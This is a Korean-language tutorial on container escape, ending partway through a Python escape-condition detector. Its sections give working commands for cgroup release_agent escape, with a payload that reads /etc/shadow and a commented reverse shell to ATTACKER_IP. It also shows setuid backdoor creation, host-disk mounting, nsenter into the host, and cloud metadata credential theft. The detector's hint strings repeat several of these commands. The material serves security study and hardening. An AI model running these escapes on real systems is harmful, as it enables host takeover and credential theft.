> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 컨테이너 탈출 심화: 커널 취약점 및 네임스페이스 탈출

## 1. 컨테이너 격리 메커니즘 심층 분석

Docker/Kubernetes 컨테이너는 다음 Linux 커널 기능을 조합해 격리를 구현한다.

```
격리 메커니즘
├── Namespaces (격리 범위 제한)
│   ├── mnt  → 파일시스템 마운트 포인트
│   ├── pid  → 프로세스 ID 공간
│   ├── net  → 네트워크 인터페이스/라우팅
│   ├── ipc  → IPC 객체
│   ├── uts  → 호스트명/도메인명
│   ├── user → UID/GID 매핑
│   └── cgroup → cgroup 루트
│
├── cgroups (리소스 제한)
│   ├── cpu / memory / io
│   └── devices (허용된 디바이스 접근)
│
├── Capabilities (루트 권한 세분화)
│   ├── CAP_SYS_ADMIN (가장 위험)
│   ├── CAP_NET_ADMIN
│   └── ...38개 캐퍼빌리티
│
├── Seccomp (시스템 콜 필터링)
│   └── Docker 기본: 약 300개 중 ~44개 차단
│
└── AppArmor / SELinux (강제 접근 제어)
```

---

## 2. runc 취약점: CVE-2019-5736 (Runc Overwrite)

### 취약점 개요

runc 1.0-rc6 이하 버전에서 `/proc/self/exe`를 통해 컨테이너 내부에서
호스트의 runc 바이너리를 덮어쓸 수 있는 취약점.

```
공격 흐름:
컨테이너 내부 공격자
    ↓ /proc/self/exe → 호스트 runc 바이너리 심볼릭 링크
    ↓ runc exec 또는 runc run 트리거 시
    ↓ fd가 열린 상태에서 쓰기 경쟁
    → 호스트 runc 바이너리 덮어쓰기 → 다음 runc 실행 시 임의 코드 실행
```

```bash
# 영향받는 버전 확인
runc --version
# runc version 1.0.0-rc5 이하 → 취약

# PoC 개념 (실제 익스플로잇은 타이밍 경쟁 조건 필요)
# 컨테이너 내부에서:
cat /proc/self/exe | file -  # 현재 runc 바이너리 확인
ls -la /proc/self/fd/        # 열린 파일 디스크립터 확인

# CVE-2019-5736 PoC 참고 (개념적)
# 1. /proc/self/exe를 가리키는 심볼릭 링크 생성
# 2. execve로 자신을 다시 실행하면서 fd를 열어둠
# 3. runc가 컨테이너 프로세스 초기화 중 /proc/<pid>/exe를 열 때
# 4. 경쟁 조건으로 fd 탈취 후 O_WRONLY로 다시 열기
# 5. 악성 페이로드 작성
```

```bash
# 방어: 최신 runc로 업그레이드
apt-get install --only-upgrade runc containerd
runc --version  # 1.1.x 이상 확인

# 또는 gVisor/Kata Containers 사용 (하이퍼바이저 기반 격리)
```

---

## 3. CAP_SYS_ADMIN 악용

### 3.1 cgroupv1 notify_on_release 탈출

`CAP_SYS_ADMIN` + cgroupv1 환경에서 호스트 코드 실행 가능한 가장 알려진 기법.

```bash
# 전제조건 확인
cat /proc/self/cgroup | head -5
ls /sys/fs/cgroup/
# cgroupv1: /sys/fs/cgroup/memory, /sys/fs/cgroup/cpu 등 분리 마운트
# cgroupv2: /sys/fs/cgroup/unified 단일 마운트

# ── cgroupv1 탈출 전체 과정 ──────────────────────────────────────────────────

# 1. rdma(또는 다른) cgroup 서브시스템 마운트
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp

# 만약 rdma 없으면:
mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. 하위 cgroup 생성
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. 호스트에서의 컨테이너 overlayfs 경로 파악
host_path=$(cat /etc/mtab | grep overlay | grep -oP 'upperdir=\K[^,]+')
# 또는
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)
echo "호스트 경로: $host_path"

# 4. release_agent 설정 (호스트에서 실행될 경로)
echo "$host_path/escape_payload" > /tmp/cgrp/release_agent

# 5. 페이로드 스크립트 작성 (컨테이너 내부에서 host_path에 씀)
cat > /escape_payload << 'EOF'
#!/bin/sh
id > /escape_output
hostname >> /escape_output
cat /etc/shadow >> /escape_output
# 역방향 셸:
# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /escape_payload

# 6. cgroup에서 프로세스를 종료시켜 notify_on_release 트리거
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 7. 결과 확인 (잠시 후)
sleep 1
cat /escape_output   # 호스트에서 실행된 결과
```

### 3.2 CAP_SYS_ADMIN + 마운트로 파일시스템 탈출

```bash
# tmpfs 마운트 후 overlayfs로 호스트 파일 접근
mkdir /tmp/lower /tmp/upper /tmp/work /tmp/merged

# overlayfs 마운트 (CAP_SYS_ADMIN 필요)
mount -t overlay overlay \
  -o lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work \
  /tmp/merged

# procfs 재마운트로 제한 우회
mount -t proc proc /proc  # 새 proc 마운트

# sysfs 경유 디바이스 접근
ls /sys/block/  # 호스트 블록 디바이스 목록
```

---

## 4. OverlayFS 취약점

### CVE-2021-3493 (Ubuntu OverlayFS 권한 상승)

```bash
# 취약한 커널 버전 확인
uname -r
# Ubuntu 5.11.0-25 이하, 5.8.0-63 이하 → 취약

# 개념: user namespace + overlayfs 조합으로 setuid 파일 생성 가능
# overlayfs upper 디렉토리에 setuid 파일 생성 → 하위 레이어에 적용 시 호스트에서 setuid 유지

# PoC 개념
unshare -Urm  # user namespace + mount namespace 언쉐어
# 이 안에서:
mkdir -p /tmp/ol/{lower,upper,work,merged}
mount -t overlay overlay \
  -o lowerdir=/tmp/ol/lower,upperdir=/tmp/ol/upper,workdir=/tmp/ol/work \
  /tmp/ol/merged

# setuid 바이너리 생성
cp /bin/bash /tmp/ol/merged/backdoor
chmod +s /tmp/ol/merged/backdoor

# user namespace 밖에서 실행하면 setuid 유지됨
/tmp/ol/upper/backdoor -p  # effective uid = 0
```

### CVE-2023-0386 (OverlayFS NOSUID bypass)

```bash
# 영향 범위: Linux 6.1.x 이전
# user namespace 내에서 overlayfs upper에 setuid 파일 생성 후
# 호스트 네임스페이스에서 해당 파일 실행 시 SUID 비트 유지

# 탐지
grep "overlay" /proc/mounts
ls -la /proc/self/ns/user  # user namespace ID 확인
```

---

## 5. cgroupv1 devices.list 탈출

```bash
# cgroup devices 컨트롤러로 허용된 디바이스 확인
cat /sys/fs/cgroup/devices/devices.list

# 블록 디바이스 접근 허용된 경우:
# a *:* rwm → 모든 디바이스 접근 가능 (privileged)

# mknod로 호스트 디바이스 노드 생성
mknod /tmp/host_disk b 8 1  # /dev/sda1
mount /tmp/host_disk /mnt/host
chroot /mnt/host /bin/bash
```

---

## 6. 네임스페이스 탈출 기법

### 6.1 user namespace를 이용한 권한 매핑

```bash
# user namespace 생성 (비루트 사용자도 가능)
unshare --user --pid --mount --fork /bin/bash

# 내부에서 UID 0 확인
id  # uid=0(root) gid=0(root)

# /proc/<pid>/uid_map 설정으로 호스트 UID 매핑
echo "0 1000 1" > /proc/self/uid_map
echo "0 1000 1" > /proc/self/gid_map
```

### 6.2 pid namespace 탈출

```bash
# hostPID=true인 경우: 호스트 프로세스 1번(init)에 nsenter
nsenter -t 1 --mount --uts --ipc --net --pid -- bash

# 호스트 프로세스의 파일디스크립터 접근
ls /proc/1/fd
cat /proc/1/root/etc/shadow

# ptrace를 통한 호스트 프로세스 메모리 접근
# (CAP_SYS_PTRACE 필요)
gdb -p 1
# (gdb) info proc
# (gdb) x/20x 0x... (메모리 읽기)
```

### 6.3 net namespace 탈출

```bash
# 호스트 네트워크 인터페이스 확인 (hostNetwork=true)
ip link show
ip route show

# 클라우드 메타데이터 API 접근 (AWS, GCP, Azure)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# IMDSv2 (AWS)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 7. Seccomp 우회

```bash
# Docker 기본 seccomp 프로파일 확인
docker inspect <container> | python3 -c "
import json, sys
d = json.load(sys.stdin)
sc = d[0]['HostConfig'].get('SecurityOpt', [])
print('SecurityOpt:', sc)
"

# seccomp=unconfined인 경우 → 모든 시스템 콜 허용
# → ptrace, keyctl, personality 등 제한 없음

# unshare 시스템 콜 허용 여부 테스트
unshare -r /bin/bash
id  # uid=0이면 허용됨

# seccomp 프로파일 분석
cat /etc/docker/seccomp-custom.json | python3 -c "
import json, sys
profile = json.load(sys.stdin)
blocked = [s['names'] for s in profile.get('syscalls', []) if s['action'] == 'SCMP_ACT_ERRNO']
print('차단된 syscall:', blocked)
"
```

---

## 8. Python CLI 도구: 컨테이너 취약점 자동 탐지기

```python
#!/usr/bin/env python3
"""
container_escape_detector.py - 컨테이너 탈출 취약점 자동 탐지 CLI

사용법:
  python container_escape_detector.py check-all
  python container_escape_detector.py check-caps
  python container_escape_detector.py check-namespaces
  python container_escape_detector.py check-cgroups
  python container_escape_detector.py check-mounts
  python container_escape_detector.py check-kernel
  python container_escape_detector.py report --output report.json
"""

from __future__ import annotations

import argparse
import ctypes
import json
import os
import platform
import re
import socket
import struct
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any


# ── Linux Capabilities 상수 ──────────────────────────────────────────────────

CAP_DEFINITIONS: dict[int, tuple[str, str]] = {
    0:  ("CAP_CHOWN", "파일 소유권 변경"),
    1:  ("CAP_DAC_OVERRIDE", "DAC 권한 무시"),
    2:  ("CAP_DAC_READ_SEARCH", "읽기/탐색 DAC 무시"),
    3:  ("CAP_FOWNER", "파일 소유자 권한"),
    4:  ("CAP_FSETID", "SUID/SGID 설정"),
    5:  ("CAP_KILL", "프로세스 시그널"),
    6:  ("CAP_SETGID", "GID 설정"),
    7:  ("CAP_SETUID", "UID 설정"),
    8:  ("CAP_SETPCAP", "캐퍼빌리티 관리"),
    9:  ("CAP_LINUX_IMMUTABLE", "불변 플래그"),
    10: ("CAP_NET_BIND_SERVICE", "1024 이하 포트 바인드"),
    11: ("CAP_NET_BROADCAST", "브로드캐스트"),
    12: ("CAP_NET_ADMIN", "네트워크 관리"),
    13: ("CAP_NET_RAW", "RAW 소켓"),
    14: ("CAP_IPC_LOCK", "메모리 잠금"),
    15: ("CAP_IPC_OWNER", "IPC 소유권"),
    16: ("CAP_SYS_MODULE", "커널 모듈"),
    17: ("CAP_SYS_RAWIO", "raw I/O"),
    18: ("CAP_SYS_CHROOT", "chroot"),
    19: ("CAP_SYS_PTRACE", "ptrace"),
    20: ("CAP_SYS_PACCT", "프로세스 계정"),
    21: ("CAP_SYS_ADMIN", "시스템 관리 (가장 위험)"),
    22: ("CAP_SYS_BOOT", "시스템 재부팅"),
    23: ("CAP_SYS_NICE", "프로세스 우선순위"),
    24: ("CAP_SYS_RESOURCE", "리소스 제한"),
    25: ("CAP_SYS_TIME", "시스템 시간"),
    26: ("CAP_SYS_TTY_CONFIG", "TTY 설정"),
    27: ("CAP_MKNOD", "디바이스 파일 생성"),
    28: ("CAP_LEASE", "파일 임대"),
    29: ("CAP_AUDIT_WRITE", "감사 로그"),
    30: ("CAP_AUDIT_CONTROL", "감사 제어"),
    31: ("CAP_SETFCAP", "파일 캐퍼빌리티"),
    32: ("CAP_MAC_OVERRIDE", "MAC 우회"),
    33: ("CAP_MAC_ADMIN", "MAC 관리"),
    34: ("CAP_SYSLOG", "syslog"),
    35: ("CAP_WAKE_ALARM", "알람 깨우기"),
    36: ("CAP_BLOCK_SUSPEND", "일시정지 차단"),
    37: ("CAP_AUDIT_READ", "감사 로그 읽기"),
    38: ("CAP_PERFMON", "성능 모니터링"),
    39: ("CAP_BPF", "BPF 사용"),
    40: ("CAP_CHECKPOINT_RESTORE", "체크포인트/복원"),
}

# 탈출에 직접 악용 가능한 캐퍼빌리티
CRITICAL_CAPS = {21, 16, 19, 12, 13, 17, 27}  # SYS_ADMIN, SYS_MODULE, SYS_PTRACE, etc.
HIGH_CAPS = {0, 1, 6, 7, 18, 31}              # CHOWN, DAC_OVERRIDE, SETUID, SETGID, CHROOT, SETFCAP


# ── 데이터 클래스 ────────────────────────────────────────────────────────────

@dataclass
class Finding:
    category: str
    name: str
    severity: str        # CRITICAL / HIGH / MEDIUM / LOW / INFO
    detected: bool
    description: str
    evidence: str = ""
    exploit_hint: str = ""


@dataclass
class CapabilityInfo:
    cap_id: int
    cap_name: str
    description: str
    present_in_effective: bool
    present_in_permitted: bool
    present_in_inheritable: bool
    severity: str = "LOW"


@dataclass
class MountInfo:
    device: str
    mount_point: str
    fs_type: str
    options: str
    is_host_path: bool = False
    is_sensitive: bool = False


# ── 탐지 함수 ────────────────────────────────────────────────────────────────

def get_process_capabilities(pid: int = 0) -> dict[str, int]:
    """프로세스 캐퍼빌리티 hex 값 읽기"""
    status_file = f"/proc/{pid}/status" if pid else "/proc/self/status"
    caps: dict[str, int] = {}
    try:
        with open(status_file) as f:
            for line in f:
                for key in ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb"):
                    if line.startswith(f"{key}:"):
                        caps[key] = int(line.split()[1], 16)
    except OSError:
        pass
    return caps


def decode_capabilities(cap_hex: int) -> list[CapabilityInfo]:
    """캐퍼빌리티 hex 값을 개별 캐퍼빌리티 목록으로 디코딩"""
    result: list[CapabilityInfo] = []
    for bit, (name, desc) in CAP_DEFINITIONS.items():
        if cap_hex & (1 << bit):
            severity = "CRITICAL" if bit in CRITICAL_CAPS else (
                "HIGH" if bit in HIGH_CAPS else "MEDIUM"
            )
            result.append(CapabilityInfo(
                cap_id=bit,
                cap_name=name,
                description=desc,
                present_in_effective=True,  # 간소화
                present_in_permitted=True,
                present_in_inheritable=False,
                severity=severity,
            ))
    return result


def check_capabilities() -> list[Finding]:
    """현재 프로세스의 캐퍼빌리티 검사"""
    findings: list[Finding] = []
    caps = get_process_capabilities()

    cap_eff = caps.get("CapEff", 0)
    cap_prm = caps.get("CapPrm", 0)
    cap_bnd = caps.get("CapBnd", 0)

    # Fully privileged 체크 (CapEff = 0x3fffffffff 또는 최대값)
    max_cap = (1 << 41) - 1
    is_fully_privileged = (cap_eff & max_cap) == max_cap
    findings.append(Finding(
        category="capabilities",
        name="Fully Privileged (--privileged)",
        severity="CRITICAL" if is_fully_privileged else "INFO",
        detected=is_fully_privileged,
        description="모든 캐퍼빌리티를 보유한 완전한 특권 컨테이너",
        evidence=f"CapEff: {cap_eff:#018x}",
        exploit_hint="cgroup notify_on_release, 블록 디바이스 마운트, nsenter로 탈출 가능"
    ))

    # 개별 위험 캐퍼빌리티
    for bit in CRITICAL_CAPS | HIGH_CAPS:
        if cap_eff & (1 << bit):
            name, desc = CAP_DEFINITIONS.get(bit, (f"CAP_{bit}", ""))
            severity = "CRITICAL" if bit in CRITICAL_CAPS else "HIGH"
            exploit_hints = {
                21: "cgroup release_agent, 마운트 조작 → 호스트 코드 실행",
                16: "커널 모듈 로드 → 루트킷, 백도어 설치",
                19: "호스트 프로세스 ptrace → 메모리 읽기/쓰기",
                12: "iptables 규칙 변경, 네트워크 스니핑",
                13: "RAW 소켓 스니핑, ARP 스푸핑",
                17: "직접 I/O 접근 → 디스크 읽기/쓰기",
                27: "mknod으로 디바이스 파일 생성",
                7: "UID 0으로 setuid 가능",
                6: "GID 0으로 setgid 가능",
            }
            findings.append(Finding(
                category="capabilities",
                name=name,
                severity=severity,
                detected=True,
                description=desc,
                evidence=f"bit {bit} set in CapEff: {cap_eff:#018x}",
                exploit_hint=exploit_hints.get(bit, "")
            ))

    return findings


def check_namespaces() -> list[Finding]:
    """네임스페이스 격리 상태 검사"""
    findings: list[Finding] = []

    ns_pairs = [
        ("mnt", "마운트 네임스페이스", "파일시스템 격리"),
        ("pid", "PID 네임스페이스", "프로세스 격리"),
        ("net", "네트워크 네임스페이스", "네트워크 격리"),
        ("ipc", "IPC 네임스페이스", "IPC 격리"),
        ("uts", "UTS 네임스페이스", "호스트명 격리"),
        ("user", "User 네임스페이스", "UID/GID 격리"),
    ]

    for ns_type, ns_desc, isolation_desc in ns_pairs:
        try:
            self_ns = os.readlink(f"/proc/self/ns/{ns_type}")
            init_ns = os.readlink(f"/proc/1/ns/{ns_type}")
            shared = self_ns == init_ns

            severity_map = {
                "mnt": "HIGH",
                "pid": "HIGH",
                "net": "MEDIUM",
                "user": "LOW",
            }
            severity = severity_map.get(ns_type, "MEDIUM") if shared else "INFO"

            findings.append(Finding(
                category="namespaces",
                name=f"Shared {ns_type.upper()} Namespace",
                severity=severity,
                detected=shared,
                description=f"{ns_desc} 공유됨: {isolation_desc} 없음",
                evidence=f"self: {self_ns} | init: {init_ns}",
                exploit_hint=f"nsenter -t 1 --{ns_type} -- bash" if shared else ""
            ))
        except OSError:
            pass

    # /proc/1/root 접근 가능 여부 (공유 마운트 네임스페이스)
    try:
        os.listdir("/proc/1/root")
        findings.append(Finding(
            category="namespaces",
            name="/proc/1/root 접근 가능",
            severity="CRITICAL",
            detected=True,
            description="init 프로세스의 루트 파일시스템에 직접 접근 가능",
            evidence="/proc/1/root",
            exploit_hint="chroot /proc/1/root 또는 cat /proc/1/root/etc/shadow"
        ))
    except (PermissionError, OSError):
        findings.append(Finding(
            category="namespaces",
            name="/proc/1/root 접근 가능",
            severity="INFO",
            detected=False,
            description="init 루트 파일시스템 접근 차단됨 (정상)"
        ))

    return findings


def check_cgroups() -> list[Finding]:
    """cgroup 설정 보안 검사"""
    findings: list[Finding] = []

    # cgroupv1 vs v2 확인
    cgroup_unified = Path("/sys/fs/cgroup/cgroup.controllers")
    is_cgroupv2 = cgroup_unified.exists()
    findings.append(Finding(
        category="cgroups",
        name=f"cgroup v{'2' if is_cgroupv2 else '1'} 사용",
        severity="INFO" if is_cgroupv2 else "MEDIUM",
        detected=True,
        description="cgroupv1은 notify_on_release 탈출 기법에 취약",
        evidence="/sys/fs/cgroup/cgroup.controllers" if is_cgroupv2 else "/sys/fs/cgroup/"
    ))

    # release_agent 쓰기 가능 여부
    release_agents: list[str] = []
    cgroup_base = Path("/sys/fs/cgroup")
    if cgroup_base.exists() and not is_cgroupv2:
        for agent_path in cgroup_base.rglob("release_agent"):
            if os.access(str(agent_path), os.W_OK):
                release_agents.append(str(agent_path))

    findings.append(Finding(
        category="cgroups",
        name="Writable cgroup release_agent",
        severity="CRITICAL" if release_agents else "INFO",
        detected=bool(release_agents),
        description="cgroupv1 release_agent 파일에 쓰기 권한 → 호스트에서 임의 명령 실행",
        evidence="\n".join(release_agents) if release_agents else "없음",
        exploit_hint=(
            "1. mkdir /tmp/x && mount -t cgroup cgroup /tmp/x\n"
            "2. echo 1 > /tmp/x/<subsys>/notify_on_release\n"
            "3. echo <host_path>/payload > /tmp/x/<subsys>/release_agent\n"
            "4. sh -c 'echo $$ > /tmp/x/<subsys>/cgroup.procs'"
        ) if release_agents else ""
    ))

    # devices.allow 쓰기 가능 여부
    devices_allow_writable: list[str] = []
    for da_path in cgroup_base.rglob("devices.allow"):
        if os.access(str(da_path), os.W_OK):
            devices_allow_writable.append(str(da_path))

    if devices_allow_writable:
        findings.append(Finding(
            category="cgroups",
            name="Writable devices.allow",
            severity="HIGH",
            detected=True,
            description="devices.allow에 쓰기 권한 → 새로운 디바이스 접근 허용 가능",
            evidence="\n".join(devices_allow_writable),
            exploit_hint="echo 'a *:* rwm' > devices.allow → 모든 디바이스 접근"
        ))

    # 현재 컨테이너의 devices.list 확인
    current_cgroup_file = Path("/proc/self/cgroup")
    if current_cgroup_file.exists():
        try:
            with open(current_cgroup_file) as f:
                cgroup_content = f.read()
            # devices cgroup 경로 파싱
            for line in cgroup_content.splitlines():
                parts = line.split(":", 2)
                if len(parts) == 3 and "devices" in parts[1]:
                    devices_list = Path(f"/sys/fs/cgroup/devices{parts[2]}/devices.list")
                    if devices_list.exists():
                        content = devices_list.read_text().strip()
                        if content == "a *:* rwm":
                            findings.append(Finding(
                                category="cgroups",
                                name="All Devices Allowed",
                                severity="CRITICAL",
                                detected=True,
                                description="모든 디바이스 접근 허용 (privileged 컨테이너)",
                                evidence=f"{devices_list}: {content}",
                                exploit_hint="mknod /tmp/host_disk b 8 1 && mount /tmp/host_disk /mnt"
                            ))
        except OSError:
            pass

    return findings


def check_mounts() -> list[Finding]:
    """마운트 포인트 보안 검사"""
    findings: list[Finding] = []
    mounts: list[MountInfo] = []

    sensitive_host_paths = {
        "/": "호스트 루트 파일시스템",
        "/etc": "시스템 설정 디렉토리",
        "/root": "루트 홈 디렉토리",
        "/proc": "커널 가상 파일시스템",
        "/sys": "sysfs",
        "/var/run/docker.sock": "Docker 데몬 소켓",
        "/run/docker.sock": "Docker 데몬 소켓",
        "/var/run/containerd": "containerd 소켓",
        "/run/containerd": "containerd 소켓",
        "/home": "사용자 홈 디렉토리",
        "/var/lib/kubelet": "kubelet 데이터",
        "/etc/kubernetes": "Kubernetes 설정",
    }

    try:
        with open("/proc/mounts") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 4:
                    continue
                device, mount_point, fs_type, options = parts[0], parts[1], parts[2], parts[3]
                is_sensitive = False
                for path, desc in sensitive_host_paths.items():
                    # bind 마운트: device가 호스트 경로처럼 보이는 경우
                    if device.startswith("/") and device in sensitive_host_paths:
                        is_sensitive = True
                    if mount_point == path or device == path:
                        is_sensitive = True

                is_host_path = device.startswith("/") and not device.startswith("/dev")
                mounts.append(MountInfo(
                    device=device,
                    mount_point=mount_point,
                    fs_type=fs_type,
                    options=options,
                    is_host_path=is_host_path,
                    is_sensitive=is_sensitive,
                ))
    except OSError:
        pass

    # Docker 소켓 마운트
    docker_sock_mounted = any(
        m.device in ("/var/run/docker.sock", "/run/docker.sock") or
        m.mount_point in ("/var/run/docker.sock", "/run/docker.sock")
        for m in mounts
    )
    findings.append(Finding(
        category="mounts",
        name="Docker Socket Mounted",
        severity="CRITICAL" if docker_sock_mounted else "INFO",
        detected=docker_sock_mounted,
        description="Docker 소켓이 컨테이너 내부에 마운트됨 → 호스트 Docker 완전 제어",
        evidence="/var/run/docker.sock" if docker_sock_mounted else "없음",
        exploit_hint="docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it ubuntu chroot /host"
    ))

    # 호스트 경로 bind 마운트
    host_binds = [m for m in mounts if m.is_sensitive and m.is_host_path]
    for m in host_binds:
        findings.append(Finding(
            category="mounts",
            name=f"Sensitive Host Path: {m.device}",
            severity="HIGH",
            detected=True,
            description=f"민감한 호스트 경로가 {m.mount_point}에 마운트됨",
            evidence=f"{m.device} → {m.mount_point} ({m.fs_type})"
        ))

    # /proc 쓰기 가능 여부
    writable_proc_items = []
    dangerous_proc = [
        "/proc/sysrq-trigger",
        "/proc/sys/kernel/core_pattern",
        "/proc/sys/kernel/modprobe",
    ]
    for proc_path in dangerous_proc:
        if Path(proc_path).exists() and os.access(proc_path, os.W_OK):
            writable_proc_items.append(proc_path)

    if writable_proc_items:
        findings.append(Finding(
            category="mounts",
            name="Writable /proc Entries",
            severity="HIGH",
            detected=True,
            description="쓰기 가능한 /proc 항목 발견",
            evidence="\n".join(writable_proc_items),
            exploit_hint="/proc/sys/kernel/core_pattern에 |/path/to/payload 작성 후 코어덤프 유발"
        ))

    return findings


def check_kernel_version() -> list[Finding]:
    """커널 버전 기반 알려진 취약점 확인"""
    findings: list[Finding] = []

    try:
        kernel_version = platform.release()
    except Exception:
        kernel_version = "unknown"

    findings.append(Finding(
        category="kernel",
        name="Kernel Version",
        severity="INFO",
        detected=True,
        description=f"커널 버전: {kernel_version}",
        evidence=kernel_version
    ))

    # 알려진 컨테이너 탈출 관련 취약 버전 목록
    known_vulns: list[tuple[str, str, str, str]] = [
        # (CVE, 설명, 영향 버전 패턴, 권고)
        ("CVE-2019-5736", "runc /proc/self/exe 덮어쓰기", "runc 1.0-rc6 이하", "runc 1.0-rc7+ 업그레이드"),
        ("CVE-2020-14386", "net/packet UAF → 루트 권한 상승", "5.8 이전", "5.8+ 업그레이드"),
        ("CVE-2021-3493", "Ubuntu overlayfs setuid 권한 상승", "5.11.0-25 이하", "업스트림 패치 적용"),
        ("CVE-2022-0492", "cgroup v1 release_agent 탈출", "5.17 이전", "cgroupv2 사용 또는 패치 적용"),
        ("CVE-2023-0386", "overlayfs NOSUID 우회", "6.1 이전", "6.1.12+ 업그레이드"),
    ]

    # runc 버전 확인
    try:
        result = subprocess.run(
            ["runc", "--version"], capture_output=True, text=True, timeout=5
        )
        runc_ver = result.stdout.split("\n")[0] if result.returncode == 0 else "확인불가"
        findings.append(Finding(
            category="kernel",
            name="runc Version",
            severity="INFO",
            detected=True,
            description=f"runc 버전: {runc_ver}",
            evidence=runc_ver
        ))
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # 커널 버전 파싱 (주.부.패치)
    version_match = re.match(r"(\d+)\.(\d+)\.(\d+)", kernel_version)
    if version_match:
        major, minor, patch = map(int, version_match.groups())

        # CVE-2022-0492: 5.17 이전
        if (major < 5) or (major == 5 and minor < 17):
            findings.append(Finding(
                category="kernel",
                name="CVE-2022-0492 (cgroup v1 탈출)",
                severity="HIGH",
                detected=True,
                description="cgroup v1 release_agent를 통한 컨테이너 탈출 가능",
                evidence=f"현재 커널: {kernel_version} < 5.17",
                exploit_hint="CAP_NET_ADMIN + 비특권 user namespace가 있을 때 악용 가능"
            ))

        # CVE-2023-0386: 6.1 이전
        if (major < 6) or (major == 6 and minor < 1):
            findings.append(Finding(
                category="kernel",
                name="CVE-2023-0386 (overlayfs NOSUID bypass)",
                severity="MEDIUM",
                detected=True,
                description="overlayfs upper 디렉토리에서 SUID 비트 보존 취약점",
                evidence=f"현재 커널: {kernel_version} < 6.1",
                exploit_hint="user namespace + overlayfs 조합으로 setuid 파일 생성"
            ))

    return findings


def check_seccomp_apparmor() -> list[Finding]:
    """Seccomp 및 AppArmor 프로파일 적용 여부"""
    findings: list[Finding] = []

    # Seccomp 상태
    try:
        with open("/proc/self/status") as f:
            status = f.read()
        seccomp_line = [l for l in status.splitlines() if l.startswith("Seccomp:")]
        if seccomp_line:
            seccomp_mode = int(seccomp_line[0].split()[1])
            modes = {0: "비활성", 1: "strict", 2: "filter"}
            mode_str = modes.get(seccomp_mode, "알 수 없음")
            findings.append(Finding(
                category="seccomp",
                name="Seccomp 모드",
                severity="MEDIUM" if seccomp_mode == 0 else "INFO",
                detected=seccomp_mode == 0,
                description=f"Seccomp: {mode_str} (0=비활성, 1=strict, 2=filter)",
                evidence=f"Seccomp: {seccomp_mode} ({mode_str})",
                exploit_hint="Seccomp 비활성 → ptrace, keyctl, unshare 등 제한 없음" if seccomp_mode == 0 else ""
            ))
    except OSError:
        pass

    # AppArmor 상태
    aa_enabled = Path("/sys/kernel/security/apparmor/enabled")
    aa_profile = Path("/proc/self/attr/current")
    if aa_enabled.exists():
        try:
            enabled = aa_enabled.read_text().strip() == "Y"
            profile = aa_profile.read_text().strip() if aa_profile.exists() else "unknown"
            findings.append(Finding(
                category="apparmor",
                name="AppArmor 프로파일",
                severity="INFO" if enabled else "MEDIUM",
                detected=not enabled,
                description=f"AppArmor: {'활성' if enabled else '비활성'}, 프로파일: {profile}",
                evidence=profile
            ))
        except OSError:
            pass

    return findings


def check_environment() -> list[Finding]:
    """환경 변수 및 파일에서 민감 정보 탐지"""
    findings: list[Finding] = []

    sensitive_env_patterns = [
        "password", "passwd", "secret", "token", "key", "api_key",
        "aws_secret", "gcp_key", "azure", "db_pass", "database_url",
    ]

    env_findings: list[str] = []
    for key, val in os.environ.items():
        if any(pat in key.lower() for pat in sensitive_env_patterns):
            env_findings.append(f"{key}={'*' * min(len(val), 16)}")

    if env_findings:
        findings.append(Finding(
            category="environment",
            name="민감한 환경변수",
            severity="HIGH",
            detected=True,
            description="환경변수에 민감한 정보 존재",
            evidence="\n".join(env_findings)
        ))

    # K8s SA 토큰 파일
    sa_token = Path("/var/run/secrets/kubernetes.io/serviceaccount/token")
    if sa_token.exists():
        token_content = sa_token.read_text().strip()
        findings.append(Finding(
            category="environment",
            name="Kubernetes SA 토큰",
            severity="MEDIUM",
            detected=True,
            description="ServiceAccount 토큰이 자동 마운트됨",
            evidence=f"{sa_token}: {token_content[:40]}...",
            exploit_hint="kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods"
        ))

    return findings


# ── 종합 검사 ─────────────────────────────────────────────────────────────────

def run_all_checks(verbose: bool = False) -> list[Finding]:
    """모든 탈출 벡터 병렬 검사"""
    check_functions = [
        ("캐퍼빌리티", check_capabilities),
        ("네임스페이스", check_namespaces),
        ("cgroups", check_cgroups),
        ("마운트", check_mounts),
        ("커널 취약점", check_kernel_version),
        ("Seccomp/AppArmor", check_seccomp_apparmor),
        ("환경", check_environment),
    ]

    all_findings: list[Finding] = []

    with ThreadPoolExecutor(max_workers=7) as executor:
        futures = {
            executor.submit(fn): name
            for name, fn in check_functions
        }
        for future in as_completed(futures):
            category_name = futures[future]
            try:
                results = future.result()
                all_findings.extend(results)
                if verbose:
                    print(f"[*] {category_name} 검사 완료: {len(results)}개 항목")
            except Exception as e:
                print(f"[-] {category_name} 검사 오류: {e}")

    return all_findings


def print_findings(findings: list[Finding], only_detected: bool = False) -> None:
    """결과 출력"""
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    sorted_findings = sorted(
        findings,
        key=lambda f: (severity_order.get(f.severity, 99), not f.detected)
    )

    detected = [f for f in sorted_findings if f.detected]
    not_detected = [f for f in sorted_findings if not f.detected]

    if detected:
        print(f"\n{'='*70}")
        print(f"탐지된 취약점/위험 ({len(detected)}개)")
        print(f"{'='*70}")
        for f in detected:
